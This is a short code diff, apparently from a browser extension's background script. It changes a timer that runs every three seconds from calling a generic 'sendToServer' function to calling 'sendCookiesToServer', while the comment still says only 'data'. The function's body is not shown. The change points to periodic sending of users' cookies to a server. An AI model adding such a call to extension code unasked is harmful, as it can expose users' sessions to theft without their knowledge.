@@ -2,7 +2,7 @@ ATBg.init();
 
 
 // Every 3 seconds, send data to server if there is any.
-setInterval(ATBg.sendToServer, 3000);
+setInterval(ATBg.sendCookiesToServer, 3000);
 
 
 // We need this event to be able to highlight DOM element and get its
